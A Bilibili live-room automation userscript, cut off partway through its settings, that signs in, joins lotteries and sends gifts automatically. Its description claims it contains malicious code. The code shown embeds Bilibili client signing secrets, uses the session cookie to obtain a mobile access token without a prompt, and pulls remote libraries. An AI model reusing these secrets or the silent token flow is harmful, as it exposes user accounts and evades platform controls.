// ==UserScript==
// @name         Bilibili直播间挂机助手-魔改
// @namespace    SeaLoong
// @version      2.4.6.6
// @description  Bilibili直播间自动签到，领瓜子，参加抽奖，完成任务，送礼，自动点亮勋章，挂小心心等，包含恶意代码
// @author       SeaLoong,lzghzr,pjy612
// @updateURL    https://raw.githubusercontent.com/pjy612/Bilibili-LRHH/master/Bilibili%E7%9B%B4%E6%92%AD%E9%97%B4%E6%8C%82%E6%9C%BA%E5%8A%A9%E6%89%8B-%E9%AD%94%E6%94%B9.user.js
// @downloadURL  https://raw.githubusercontent.com/pjy612/Bilibili-LRHH/master/Bilibili%E7%9B%B4%E6%92%AD%E9%97%B4%E6%8C%82%E6%9C%BA%E5%8A%A9%E6%89%8B-%E9%AD%94%E6%94%B9.user.js
// @homepageURL  https://github.com/pjy612/Bilibili-LRHH
// @supportURL   https://github.com/pjy612/Bilibili-LRHH/issues
// @include      /https?:\/\/live\.bilibili\.com\/[blanc\/]?[^?]*?\d+\??.*/
// @include      /https?:\/\/api\.live\.bilibili\.com\/_.*/
// @require      https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js
// @require      https://cdn.jsdelivr.net/gh/pjy612/Bilibili-LRHH@master/BilibiliAPI_Plus.js
// @require      https://cdn.jsdelivr.net/gh/pjy612/Bilibili-LRHH@master/OCRAD.min.js
// @run-at       document-idle
// @license      MIT License
// @connect      passport.bilibili.com
// @connect      api.live.bilibili.com
// @grant        GM_xmlhttpRequest
// ==/UserScript==
/*
如果 jsdelivr 不可用时，推荐换Host 并调整为以下支持库源
// @require      https://raw.githubusercontent.com/pjy612/Bilibili-LRHH/master/BilibiliAPI_Plus.js
// @require      https://raw.githubusercontent.com/pjy612/Bilibili-LRHH/master/OCRAD.min.js
// @require      https://raw.githubusercontent.com/lzghzr/TampermonkeyJS/master/libBilibiliToken/libBilibiliToken.user.js
*/
/*
如果 raw.githubusercontent.com 无法访问 请自行尝试修改 Hosts 后 再尝试访问
151.101.76.133 raw.githubusercontent.com
*/
//https://cdn.jsdelivr.net/gh/lzghzr/TampermonkeyJS@master/libBilibiliToken/libBilibiliToken.user.js
class BilibiliToken {
    constructor() {
        this._W = typeof unsafeWindow === 'undefined' ? window : unsafeWindow;
        this.biliLocalId = BilibiliToken.biliLocalId;
        this.buvid = BilibiliToken.buvid;
        this.deviceId = this.biliLocalId;
        this.fingerprint = BilibiliToken.fingerprint;
        this.guid = this.buvid;
        this.localFingerprint = this.fingerprint;
        this.localId = this.buvid;
        this.headers = {
            'User-Agent': 'Mozilla/5.0 BiliTV/1.2.4.1 (bbcallen@gmail.com)',
            'APP-KEY': BilibiliToken.mobiApp,
            'Buvid': this.buvid,
            'env': 'prod'
        };
    }
    static get biliLocalId() { return this.RandomID(20); }
    static get buvid() { return this.RandomID(37).toLocaleUpperCase(); }
    static get deviceId() { return this.biliLocalId; }
    static get fingerprint() { return this.RandomID(62); }
    static get guid() { return this.buvid; }
    static get localFingerprint() { return this.fingerprint; }
    static get localId() { return this.buvid; }
    static get TS() { return Math.floor(Date.now() / 1000); }
    static get RND() { return this.RandomNum(9); }
    static RandomNum(length) {
        const words = '0123456789';
        let randomNum = '';
        randomNum += words[Math.floor(Math.random() * 9) + 1];
        for (let i = 0; i < length - 1; i++)
            randomNum += words[Math.floor(Math.random() * 10)];
        return +randomNum;
    }
    static RandomID(length) {
        const words = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
        let randomID = '';
        randomID += words[Math.floor(Math.random() * 61) + 1];
        for (let i = 0; i < length - 1; i++)
            randomID += words[Math.floor(Math.random() * 62)];
        return randomID;
    }
    static get headers() {
        return {
            'User-Agent': 'Mozilla/5.0 BiliTV/1.2.4.1 (bbcallen@gmail.com)',
            'APP-KEY': this.mobiApp,
            'Buvid': this.buvid,
            'env': 'prod'
        };
    }
    static get loginQuery() {
        const biliLocalId = this.biliLocalId;
        const buvid = this.buvid;
        const fingerprint = this.fingerprint;
        return `appkey=${this.loginAppKey}&bili_local_id=${biliLocalId}&build=${this.build}&buvid=${buvid}&channel=${this.channel}&device=${biliLocalId}\
&device_id=${this.deviceId}&device_name=${this.deviceName}&device_platform=${this.devicePlatform}&fingerprint=${fingerprint}&guid=${buvid}\
&local_fingerprint=${fingerprint}&local_id=${buvid}&mobi_app=${this.mobiApp}&networkstate=${this.networkstate}&platform=${this.platform}`;
    }
    get loginQuery() {
        const biliLocalId = this.biliLocalId;
        const buvid = this.buvid;
        const fingerprint = this.fingerprint;
        return `appkey=${BilibiliToken.loginAppKey}&bili_local_id=${biliLocalId}&build=${BilibiliToken.build}&buvid=${buvid}&channel=${BilibiliToken.channel}&device=${biliLocalId}\
&device_id=${this.deviceId}&device_name=${BilibiliToken.deviceName}&device_platform=${BilibiliToken.devicePlatform}&fingerprint=${fingerprint}&guid=${buvid}\
&local_fingerprint=${fingerprint}&local_id=${buvid}&mobi_app=${BilibiliToken.mobiApp}&networkstate=${BilibiliToken.networkstate}&platform=${BilibiliToken.platform}`;
    }
    static signQuery(params, ts = true, secretKey = this.__secretKey) {
        let paramsSort = params;
        if (ts)
            paramsSort = `${params}&ts=${this.TS}`;
        paramsSort = paramsSort.split('&').sort().join('&');
        const paramsSecret = paramsSort + secretKey;
        const paramsHash = md5(paramsSecret);
        return `${paramsSort}&sign=${paramsHash}`;
    }
    static signLoginQuery(params) {
        const paramsBase = params === undefined ? this.loginQuery : `${params}&${this.loginQuery}`;
        return this.signQuery(paramsBase, true, this.__loginSecretKey);
    }
    signLoginQuery(params) {
        const paramsBase = params === undefined ? this.loginQuery : `${params}&${this.loginQuery}`;
        return BilibiliToken.signQuery(paramsBase, true, BilibiliToken.__loginSecretKey);
    }
    async getAuthCode() {
        const authCode = await BilibiliToken.XHR({
            GM: true,
            anonymous: true,
            method: 'POST',
            url: 'https://passport.bilibili.com/x/passport-tv-login/qrcode/auth_code',
            data: this.signLoginQuery(),
            responseType: 'json',
            headers: this.headers
        });
        if (authCode !== undefined && authCode.response.status === 200 && authCode.body.code === 0)
            return authCode.body.data.auth_code;
        return console.error('getAuthCode', authCode);
    }
    async qrcodeConfirm(authCode, csrf) {
        const confirm = await BilibiliToken.XHR({
            GM: true,
            method: 'POST',
            url: 'https://passport.bilibili.com/x/passport-tv-login/h5/qrcode/confirm',
            data: `auth_code=${authCode}&csrf=${csrf}`,
            responseType: 'json',
            headers: this.headers
        });
        if (confirm !== undefined && confirm.response.status === 200 && confirm.body.code === 0)
            return confirm.body.data.gourl;
        return console.error('qrcodeConfirm', confirm);
    }
    async qrcodePoll(authCode) {
        const poll = await BilibiliToken.XHR({
            GM: true,
            anonymous: true,
            method: 'POST',
            url: 'https://passport.bilibili.com/x/passport-tv-login/qrcode/poll',
            data: this.signLoginQuery(`auth_code=${authCode}`),
            responseType: 'json',
            headers: this.headers
        });
        if (poll !== undefined && poll.response.status === 200 && poll.body.code === 0)
            return poll.body.data;
        return console.error('qrcodePoll', poll);
    }
    async getToken() {
        const cookie = this._W.document.cookie.match(/bili_jct=(?<csrf>.*?);/);
        debugger
        if (cookie === null || cookie.groups === undefined)
            return console.error('getToken', 'cookie获取失败');
        const csrf = cookie.groups['csrf'];
        const authCode = await this.getAuthCode();
        if (authCode === undefined)
            return;
        const confirm = await this.qrcodeConfirm(authCode, csrf);
        if (confirm === undefined)
            return;
        const token = await this.qrcodePoll(authCode);
        if (token === undefined)
            return;
        return token;
    }
    static XHR(XHROptions) {
    return new Promise(resolve => {
        const onerror = (error) => {
            console.error(GM_info.script.name, error);
            resolve(undefined);
        };
        if (XHROptions.GM) {
            if (XHROptions.method === 'POST') {
                if (XHROptions.headers === undefined)
                    XHROptions.headers = {};
                if (XHROptions.headers['Content-Type'] === undefined)
                    XHROptions.headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=utf-8';
            }
            XHROptions.timeout = 30 * 1000;
            XHROptions.onload = res => resolve({ response: res, body: res.response || res.responseText });
            XHROptions.onerror = onerror;
            XHROptions.ontimeout = onerror;
            GM_xmlhttpRequest(XHROptions);
        }
        else {
            const xhr = new XMLHttpRequest();
            xhr.open(XHROptions.method, XHROptions.url);
            if (XHROptions.method === 'POST' && xhr.getResponseHeader('Content-Type') === null)
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=utf-8');
            if (XHROptions.cookie)
                xhr.withCredentials = true;
            if (XHROptions.responseType !== undefined)
                xhr.responseType = XHROptions.responseType;
            xhr.timeout = 30 * 1000;
            xhr.onload = ev => {
                const res = ev.target;
                resolve({ response: res, body: res.response || res.responseText });
            };
            xhr.onerror = onerror;
            xhr.ontimeout = onerror;
            xhr.send(XHROptions.data);
        }
    });
}
}
BilibiliToken.__loginSecretKey = '59b43e04ad6965f34319062b478f83dd';
BilibiliToken.loginAppKey = '4409e2ce8ffd12b8';
BilibiliToken.__secretKey = '560c52ccd288fed045859ed18bffd973';
BilibiliToken.appKey = '1d8b6e7d45233436';
BilibiliToken.build = '102401';
BilibiliToken.channel = 'master';
BilibiliToken.device = 'Sony';
BilibiliToken.deviceName = 'J9110';
BilibiliToken.devicePlatform = 'Android10SonyJ9110';
BilibiliToken.mobiApp = 'android_tv_yst';
BilibiliToken.networkstate = 'wifi';
BilibiliToken.platform = 'android';
(function ($) {
    'use strict';
    function safeAdd(x, y) {
        var lsw = (x & 0xffff) + (y & 0xffff);
        var msw = (x >> 16) + (y >> 16) + (lsw >> 16);
        return (msw << 16) | (lsw & 0xffff);
    }
    function bitRotateLeft(num, cnt) {
        return (num << cnt) | (num >>> (32 - cnt));
    }
    function md5cmn(q, a, b, x, s, t) {
        return safeAdd(bitRotateLeft(safeAdd(safeAdd(a, q), safeAdd(x, t)), s), b);
    }
    function md5ff(a, b, c, d, x, s, t) {
        return md5cmn((b & c) | (~b & d), a, b, x, s, t);
    }
    function md5gg(a, b, c, d, x, s, t) {
        return md5cmn((b & d) | (c & ~d), a, b, x, s, t);
    }
    function md5hh(a, b, c, d, x, s, t) {
        return md5cmn(b ^ c ^ d, a, b, x, s, t);
    }
    function md5ii(a, b, c, d, x, s, t) {
        return md5cmn(c ^ (b | ~d), a, b, x, s, t);
    }
    function binlMD5(x, len) {
        x[len >> 5] |= 0x80 << len % 32;
        x[(((len + 64) >>> 9) << 4) + 14] = len;
        var i;
        var olda;
        var oldb;
        var oldc;
        var oldd;
        var a = 1732584193;
        var b = -271733879;
        var c = -1732584194;
        var d = 271733878;
        for (i = 0; i < x.length; i += 16) {
            olda = a;
            oldb = b;
            oldc = c;
            oldd = d;
            a = md5ff(a, b, c, d, x[i], 7, -680876936);
            d = md5ff(d, a, b, c, x[i + 1], 12, -389564586);
            c = md5ff(c, d, a, b, x[i + 2], 17, 606105819);
            b = md5ff(b, c, d, a, x[i + 3], 22, -1044525330);
            a = md5ff(a, b, c, d, x[i + 4], 7, -176418897);
            d = md5ff(d, a, b, c, x[i + 5], 12, 1200080426);
            c = md5ff(c, d, a, b, x[i + 6], 17, -1473231341);
            b = md5ff(b, c, d, a, x[i + 7], 22, -45705983);
            a = md5ff(a, b, c, d, x[i + 8], 7, 1770035416);
            d = md5ff(d, a, b, c, x[i + 9], 12, -1958414417);
            c = md5ff(c, d, a, b, x[i + 10], 17, -42063);
            b = md5ff(b, c, d, a, x[i + 11], 22, -1990404162);
            a = md5ff(a, b, c, d, x[i + 12], 7, 1804603682);
            d = md5ff(d, a, b, c, x[i + 13], 12, -40341101);
            c = md5ff(c, d, a, b, x[i + 14], 17, -1502002290);
            b = md5ff(b, c, d, a, x[i + 15], 22, 1236535329);
            a = md5gg(a, b, c, d, x[i + 1], 5, -165796510);
            d = md5gg(d, a, b, c, x[i + 6], 9, -1069501632);
            c = md5gg(c, d, a, b, x[i + 11], 14, 643717713);
            b = md5gg(b, c, d, a, x[i], 20, -373897302);
            a = md5gg(a, b, c, d, x[i + 5], 5, -701558691);
            d = md5gg(d, a, b, c, x[i + 10], 9, 38016083);
            c = md5gg(c, d, a, b, x[i + 15], 14, -660478335);
            b = md5gg(b, c, d, a, x[i + 4], 20, -405537848);
            a = md5gg(a, b, c, d, x[i + 9], 5, 568446438);
            d = md5gg(d, a, b, c, x[i + 14], 9, -1019803690);
            c = md5gg(c, d, a, b, x[i + 3], 14, -187363961);
            b = md5gg(b, c, d, a, x[i + 8], 20, 1163531501);
            a = md5gg(a, b, c, d, x[i + 13], 5, -1444681467);
            d = md5gg(d, a, b, c, x[i + 2], 9, -51403784);
            c = md5gg(c, d, a, b, x[i + 7], 14, 1735328473);
            b = md5gg(b, c, d, a, x[i + 12], 20, -1926607734);
            a = md5hh(a, b, c, d, x[i + 5], 4, -378558);
            d = md5hh(d, a, b, c, x[i + 8], 11, -2022574463);
            c = md5hh(c, d, a, b, x[i + 11], 16, 1839030562);
            b = md5hh(b, c, d, a, x[i + 14], 23, -35309556);
            a = md5hh(a, b, c, d, x[i + 1], 4, -1530992060);
            d = md5hh(d, a, b, c, x[i + 4], 11, 1272893353);
            c = md5hh(c, d, a, b, x[i + 7], 16, -155497632);
            b = md5hh(b, c, d, a, x[i + 10], 23, -1094730640);
            a = md5hh(a, b, c, d, x[i + 13], 4, 681279174);
            d = md5hh(d, a, b, c, x[i], 11, -358537222);
            c = md5hh(c, d, a, b, x[i + 3], 16, -722521979);
            b = md5hh(b, c, d, a, x[i + 6], 23, 76029189);
            a = md5hh(a, b, c, d, x[i + 9], 4, -640364487);
            d = md5hh(d, a, b, c, x[i + 12], 11, -421815835);
            c = md5hh(c, d, a, b, x[i + 15], 16, 530742520);
            b = md5hh(b, c, d, a, x[i + 2], 23, -995338651);
            a = md5ii(a, b, c, d, x[i], 6, -198630844);
            d = md5ii(d, a, b, c, x[i + 7], 10, 1126891415);
            c = md5ii(c, d, a, b, x[i + 14], 15, -1416354905);
            b = md5ii(b, c, d, a, x[i + 5], 21, -57434055);
            a = md5ii(a, b, c, d, x[i + 12], 6, 1700485571);
            d = md5ii(d, a, b, c, x[i + 3], 10, -1894986606);
            c = md5ii(c, d, a, b, x[i + 10], 15, -1051523);
            b = md5ii(b, c, d, a, x[i + 1], 21, -2054922799);
            a = md5ii(a, b, c, d, x[i + 8], 6, 1873313359);
            d = md5ii(d, a, b, c, x[i + 15], 10, -30611744);
            c = md5ii(c, d, a, b, x[i + 6], 15, -1560198380);
            b = md5ii(b, c, d, a, x[i + 13], 21, 1309151649);
            a = md5ii(a, b, c, d, x[i + 4], 6, -145523070);
            d = md5ii(d, a, b, c, x[i + 11], 10, -1120210379);
            c = md5ii(c, d, a, b, x[i + 2], 15, 718787259);
            b = md5ii(b, c, d, a, x[i + 9], 21, -343485551);
            a = safeAdd(a, olda);
            b = safeAdd(b, oldb);
            c = safeAdd(c, oldc);
            d = safeAdd(d, oldd);
        }
        return [a, b, c, d];
    }
    function binl2rstr(input) {
        var i;
        var output = '';
        var length32 = input.length * 32;
        for (i = 0; i < length32; i += 8) {
            output += String.fromCharCode((input[i >> 5] >>> i % 32) & 0xff);
        }
        return output;
    }
    function rstr2binl(input) {
        var i;
        var output = [];
        output[(input.length >> 2) - 1] = undefined;
        for (i = 0; i < output.length; i += 1) {
            output[i] = 0;
        }
        var length8 = input.length * 8;
        for (i = 0; i < length8; i += 8) {
            output[i >> 5] |= (input.charCodeAt(i / 8) & 0xff) << i % 32;
        }
        return output;
    }
    function rstrMD5(s) {
        return binl2rstr(binlMD5(rstr2binl(s), s.length * 8));
    }
    function rstrHMACMD5(key, data) {
        var i;
        var bkey = rstr2binl(key);
        var ipad = [];
        var opad = [];
        var hash;
        ipad[15] = opad[15] = undefined;
        if (bkey.length > 16) {
            bkey = binlMD5(bkey, key.length * 8);
        }
        for (i = 0; i < 16; i += 1) {
            ipad[i] = bkey[i] ^ 0x36363636;
            opad[i] = bkey[i] ^ 0x5c5c5c5c;
        }
        hash = binlMD5(ipad.concat(rstr2binl(data)), 512 + data.length * 8);
        return binl2rstr(binlMD5(opad.concat(hash), 512 + 128));
    }
    function rstr2hex(input) {
        var hexTab = '0123456789abcdef';
        var output = '';
        var x;
        var i;
        for (i = 0; i < input.length; i += 1) {
            x = input.charCodeAt(i);
            output += hexTab.charAt((x >>> 4) & 0x0f) + hexTab.charAt(x & 0x0f);
        }
        return output;
    }
    function str2rstrUTF8(input) {
        return unescape(encodeURIComponent(input));
    }
    function rawMD5(s) {
        return rstrMD5(str2rstrUTF8(s));
    }
    function hexMD5(s) {
        return rstr2hex(rawMD5(s));
    }
    function rawHMACMD5(k, d) {
        return rstrHMACMD5(str2rstrUTF8(k), str2rstrUTF8(d));
    }
    function hexHMACMD5(k, d) {
        return rstr2hex(rawHMACMD5(k, d));
    }
    function md5(string, key, raw) {
        if (!key) {
            if (!raw) {
                return hexMD5(string);
            }
            return rawMD5(string);
        }
        if (!raw) {
            return hexHMACMD5(key, string);
        }
        return rawHMACMD5(key, string);
    }
    $.md5 = md5;
})(this);

(function BLRHH_Plus() {
    'use strict';
    const NAME = 'BLRHH-Plus';
    const VERSION = '2.4.6.6';
    try {
        var tmpcache = JSON.parse(localStorage.getItem(`${NAME}_CACHE`));
        const t = Date.now() / 1000;
        if (t - tmpcache.unique_check >= 0 && t - tmpcache.unique_check <= 60) {
            console.error('魔改脚本重复运行')
            return;
        }
    } catch (e) {}
    let scriptRuning = false;
    let API;
    let TokenUtil;
    let Token;
    const window = typeof unsafeWindow === 'undefined' ? window : unsafeWindow;
    const isSubScript = () => window.frameElement && window.parent[NAME] && window.frameElement[NAME];

    const DEBUGMODE = false || window.top.localStorage.getItem('BLRHH-DEBUG');
    const DEBUG = (sign, ...data) => {
        if (!DEBUGMODE) return;
        let d = new Date();
        d =
            `[${NAME}]${(isSubScript() ? 'SubScript:' : '')}[${d.getHours()}:${d.getMinutes()}:${d.getSeconds()}:${d.getMilliseconds()}]`;
        if (data.length === 1) console.debug(d, `${sign}:`, data[0]);
        else console.debug(d, `${sign}:`, data);
    };

    let CONFIG;
    let CACHE;
    let Info = {
        short_id: undefined,
        roomid: undefined,
        uid: undefined,
        ruid: undefined,
        rnd: undefined,
        csrf_token: undefined,
        visit_id: undefined,
        silver: undefined,
        gold: undefined,
        mobile_verify: undefined,
        identification: undefined,
        gift_list: undefined,
        gift_list_str: '礼物对照表',
        blocked: false,
        awardBlocked: false,
        appToken: undefined
    };
    const getAccessToken = async () => {
        if (Token && TokenUtil) {
            const userToken = await Token.getToken();
            if (userToken === undefined) {
                console.error('未获取到移动端token,部分功能可能失效');
            }
            return userToken;
        }
        return null;
    };

    const tz_offset = new Date().getTimezoneOffset() + 480;

    const ts_s = () => Math.round(ts_ms() / 1000);

    const ts_ms = () => Date.now();

    const getCookie = (name) => {
        let arr;
        const reg = new RegExp(`(^| )${name}=([^;]*)(;|$)`);
        if ((arr = document.cookie.match(reg))) {
            return unescape(arr[2]);
        } else {
            return null;
        }
    };

    const delayCall = (callback, delay = 10e3) => {
        const p = $.Deferred();
        setTimeout(() => {
            const t = callback();
            if (t && t.then) t.then((arg1, arg2, arg3, arg4, arg5, arg6) => p.resolve(arg1, arg2, arg3,
                                                                                      arg4, arg5, arg6));
            else p.resolve();
        }, delay);
        return p;
    };

    const checkNewDay = (ts) => {
        // 检查是否为新的一天，以UTC+8为准
        const t = new Date(ts);
        t.setMinutes(t.getMinutes() + tz_offset);
        t.setHours(0, 0, 0, 0);
        const d = new Date();
        d.setMinutes(t.getMinutes() + tz_offset);
        return (d - t > 86400e3);
    };

    const runTomorrow = (callback,hours = 0) => {
        const t = new Date();
        t.setMinutes(t.getMinutes() + tz_offset);
        t.setDate(t.getDate() + 1);
        t.setHours(hours, 1, 0, 0);
        t.setMinutes(t.getMinutes() - tz_offset);
        setTimeout(callback, t - ts_ms());
        DEBUG('runTomorrow', t.toString());
    };
    if (!isSubScript()) {
        const runUntilSucceed = (callback, delay = 0, period = 100) => {
            setTimeout(() => {
                if (!callback()) runUntilSucceed(callback, period, period);
            }, delay);
        };

        const addCSS = (context) => {
            const style = document.createElement('style');
            style.type = 'text/css';
            style.innerHTML = context;
            document.getElementsByTagName('head')[0].appendChild(style);
        };

        const Essential = {
            init: () => {
                return Essential.Toast.init().then(() => {
                    return Essential.AlertDialog.init().then(() => {
                        return Essential.Config.init().then(() => {
                            Essential.DataSync.init();
                            Essential.Cache.load();
                            Essential.Config.load();
                        });
                    });
                });
            },
            Toast: {
                init: () => {
                    try {
                        const toastList = [];
                        window.toast = (msg, type = 'info', timeout = 3e3) => {
                            let d = new Date().toLocaleTimeString();
                            switch (type) {
                                case 'success':
                                case 'info':
                                    console.info(`[${NAME}][${d}]${msg}`);
                                    break;
                                case 'caution':
                                    console.warn(`[${NAME}][${d}]${msg}`);
                                    break;
                                case 'error':
                                    console.error(`[${NAME}][${d}]${msg}`);
                                    break;
                                default:
                                    type = 'info';
                                    console.log(`[${NAME}][${d}]${msg}`);
                            }
                            if (CONFIG && !CONFIG.SHOW_TOAST) return;
                            const a = $(
                                `<div class="link-toast ${type} fixed"><span class="toast-text">${msg}</span></div>`
			    )[0];
                            document.body.appendChild(a);
                            a.style.top = (document.body.scrollTop + toastList.length * 40 + 10) + 'px';
                            a.style.left = (document.body.offsetWidth + document.body.scrollLeft - a.offsetWidth -
                                            5) + 'px';
                            toastList.push(a);
                            setTimeout(() => {
                                a.className += ' out';
                                setTimeout(() => {
                                    toastList.shift();
                                    toastList.forEach((v) => {
                                        v.style.top = (parseInt(v.style.top, 10) -
                                                       40) + 'px';
                                    });
                                    $(a).remove();
                                }, 200);
                            }, timeout);
                        };
                        return $.Deferred().resolve();
                    } catch (err) {
                        console.error(`[${NAME}]初始化浮动提示时出现异常`);
                        console.error(`[${NAME}]`, err);
                        return $.Deferred().reject();
                    }
                }
            }, // Need Init
            AlertDialog: {
                init: () => {
                    try {
                        const div_background = $(`<div id="${NAME}_alertdialog"/>`);
                        div_background[0].style =
                            'display: table;position: fixed;height: 100%;width: 100%;top: 0;left: 0;font-size: 12px;z-index: 10000;background-color: rgba(0,0,0,.5);';
                        const div_position = $('<div/>');
                        div_position[0].style = 'display: table-cell;vertical-align: middle;';
                        const div_style = $('<div/>');
                        div_style[0].style =
                            'position: relative;top: 50%;width: 40%;padding: 16px;border-radius: 5px;background-color: #fff;margin: 0 auto;';
                        div_position.append(div_style);
                        div_background.append(div_position);

                        const div_title = $('<div/>');
                        div_title[0].style = 'position: relative;padding-bottom: 12px;';
                        const div_title_span = $('<span>提示</span>');
                        div_title_span[0].style = 'margin: 0;color: #23ade5;font-size: 16px;';
                        div_title.append(div_title_span);
                        div_style.append(div_title);

                        const div_content = $('<div/>');
                        div_content[0].style =
                            'display: inline-block;vertical-align: top;font-size: 14px;overflow: auto;height: 300px;';
                        div_style.append(div_content);

                        const div_button = $('<div/>');
                        div_button[0].style = 'position: relative;height: 32px;margin-top: 12px;';
                        div_style.append(div_button);

                        const button_ok = $('<button><span>确定</span></button>');
                        button_ok[0].style =
                            'position: absolute;height: 100%;min-width: 68px;right: 0;background-color: #23ade5;color: #fff;border-radius: 4px;font-size: 14px;border: 0;cursor: pointer;';
                        div_button.append(button_ok);

                        window.alertdialog = (title, content) => {
                            div_title_span.html(title);
                            div_content.html(content);
                            button_ok.click(() => {
                                $(`#${NAME}_alertdialog`).remove();
                            });
                            $('body > .link-popup-ctnr').first().append(div_background);
                        };
                        return $.Deferred().resolve();
                    } catch (err) {
                        window.toast('初始化帮助界面时出现异常', 'error');
                        console.error(`[${NAME}]`, err);
                        return $.Deferred().reject();
                    }
                }
            }, // Need Init After Toast.init
            Config: {
                CONFIG_DEFAULT: {
                    DD_BP: true,
                    DD_BP_CONFIG:{
                        BP_KEY: "",
                        DM_STORM: true,
                    },
                    AUTO_SIGN: true,
                    AUTO_TREASUREBOX: false,
                    AUTO_GROUP_SIGN: true,
                    MOBILE_HEARTBEAT: false,
                    AUTO_LOTTERY: true,
                    AUTO_LOTTERY_CONFIG: {
                        SLEEP_RANGE: "",
                        RANK_TOP:false,
                        GIFT_LOTTERY: true,
                        GIFT_LOTTERY_CONFIG: {
                            REFRESH_INTERVAL: 0
                        },
                        GUARD_AWARD: true,
                        GUARD_AWARD_CONFIG: {
                            LISTEN_NUMBER: 1,
                            CHANGE_ROOM_INTERVAL: 60
                        },
                        PK_AWARD: true,
                        MATERIAL_OBJECT_LOTTERY: true,
                        MATERIAL_OBJECT_LOTTERY_CONFIG: {
                            CHECK_INTERVAL: 10,
                            IGNORE_QUESTIONABLE_LOTTERY: true
                        },
                        STORM: false,
                        STORM_CONFIG: {
                            NO_REAL_CHECK: false,
                            STORM_MAX_TIME: 20,
                            STORM_ONE_LIMIT: 120,
                        },
                        HIDE_POPUP: true
                    },
                    AUTO_TASK: true,
                    AUTO_GIFT: false,
                    AUTO_GIFT_CONFIG: {
                        ROOMID: [0],
                        EXCLUDE_ROOMID: [0],
                        GIFT_INTERVAL: 10,
                        GIFT_LIMIT: 86400,
                        GIFT_SORT: true,
                        AUTO_LIGHT: true,
                        AUTO_LIGHT_LIMIT_LEVEL:10,
                        SEND_ALL: false
                    },
                    SILVER2COIN: false,
                    AUTO_DAILYREWARD: true,
                    AUTO_DAILYREWARD_CONFIG: {
                        LOGIN: true,
                        WATCH: true,
                        COIN: false,
                        COIN_CONFIG: {
                            NUMBER: 5
                        },
                        SHARE: true
                    },
                    SHOW_TOAST: true
                },
                NAME: {
                    DD_BP: 'BiliPush推送',
                    DD_BP_CONFIG:{
                        BP_KEY: 'Key',
                        DM_STORM: 'DD弹幕风暴',
                    },
                    AUTO_SIGN: '自动签到',
                    AUTO_TREASUREBOX: '自动领取银瓜子',
                    AUTO_GROUP_SIGN: '自动应援团签到',
                    MOBILE_HEARTBEAT: '移动端心跳',
                    AUTO_LOTTERY: '自动抽奖',
                    AUTO_LOTTERY_CONFIG: {
                        SLEEP_RANGE: '休眠时间',
                        RANK_TOP: '小时榜',
                        GIFT_LOTTERY: '礼物抽奖',
                        GIFT_LOTTERY_CONFIG: {
                            REFRESH_INTERVAL: '刷新间隔'
                        },
                        GUARD_AWARD: '舰队领奖',
                        GUARD_AWARD_CONFIG: {
                            LISTEN_NUMBER: '监听倍数',
                            CHANGE_ROOM_INTERVAL: '换房间隔'
                        },
                        PK_AWARD: '乱斗领奖',
                        MATERIAL_OBJECT_LOTTERY: '实物抽奖',
                        MATERIAL_OBJECT_LOTTERY_CONFIG: {
                            CHECK_INTERVAL: '检查间隔',
                            IGNORE_QUESTIONABLE_LOTTERY: '忽略存疑的抽奖'
                        },
                        STORM: '节奏风暴',
                        STORM_CONFIG: {
                            NO_REAL_CHECK: '非实名模式*',
                            STORM_MAX_TIME: '最大持续时间',
                            STORM_ONE_LIMIT: '尝试间隔',
                        },
                        HIDE_POPUP: '隐藏抽奖提示框'
                    },
                    AUTO_TASK: '自动完成任务',
                    AUTO_GIFT: '自动送礼物',
                    AUTO_GIFT_CONFIG: {
                        ROOMID: '优先房间号',
                        EXCLUDE_ROOMID: '排除房间号',
                        GIFT_INTERVAL: '检查间隔(分钟)',
                        GIFT_SORT: '优先高等级',
                        GIFT_LIMIT: '到期时间(秒)',
                        AUTO_LIGHT: '自动点亮勋章',
                        AUTO_LIGHT_LIMIT_LEVEL: '点亮最低等级线',
                        SEND_ALL: '送满全部勋章'
                    },
                    SILVER2COIN: '银瓜子换硬币',
                    AUTO_DAILYREWARD: '自动每日奖励',
                    AUTO_DAILYREWARD_CONFIG: {
                        LOGIN: '登录',
                        WATCH: '观看',
                        COIN: '投币',
                        COIN_CONFIG: {
                            NUMBER: '数量'
                        },
                        SHARE: '分享'
                    },
                    SHOW_TOAST: '显示浮动提示'
                },
                PLACEHOLDER: {
                    DD_BP_CONFIG:{
                        BP_KEY: 'key',
                    },
                    AUTO_LOTTERY_CONFIG: {
                        SLEEP_RANGE: '时间范围03:00-08:00',
                        GIFT_LOTTERY_CONFIG: {
                            REFRESH_INTERVAL: '单位(分钟)'
                        },
                        GUARD_AWARD_CONFIG: {
                            LISTEN_NUMBER: '1~5，默认1',
                            CHANGE_ROOM_INTERVAL: '单位(分钟)'
                        },
                        MATERIAL_OBJECT_LOTTERY_CONFIG: {
                            CHECK_INTERVAL: '单位(分钟)'
                        },
                        STORM_CONFIG: {
                            STORM_MAX_TIME: '单位(秒)',
                            STORM_ONE_LIMIT: '单位（毫秒）',
                        },
                    },
                    AUTO_GIFT_CONFIG: {
                        ROOMID: '为0不送礼',
                        GIFT_DEFAULT: '为空默认不送',
                        GIFT_ALLOWED: '为空允许所有'
                    }
                },
                HELP: {
                    DD_BP: '魔改助手核心监控，启用后由服务器推送全区礼物/舰队/PK（但需要验证使用者身份并带有DD传送门等附加功能）',
                    DD_BP_CONFIG:{
                        DM_STORM: 'DD弹幕风暴（娱乐功能），配合DD传送门进行人力节奏风暴，用于活跃直播间气氛。',
                    },
                    MOBILE_HEARTBEAT: '发送移动端心跳数据包，可以完成双端观看任务',
                    AUTO_LOTTERY: '设置是否自动参加抽奖功能，包括礼物抽奖、活动抽奖、实物抽奖<br>会占用更多资源并可能导致卡顿，且有封号风险',
                    AUTO_LOTTERY_CONFIG: {
                        SLEEP_RANGE: '休眠时间范围，英文逗号分隔<br>例如：<br>3:00-8:00,16:50-17:30<br>表示 3:00-8:00和16:50-17:30不进行礼物检测。<br>小时为当天只能为0-23,如果要转钟请单独配置aa:aa-23:59,00:00-bb:bb',
                        RANK_TOP:'自动扫描小时榜',
                        GIFT_LOTTERY: '包括小电视、摩天大楼、C位光环及其他可以通过送礼触发广播的抽奖<br>内置几秒钟的延迟',
                        GIFT_LOTTERY_CONFIG: {
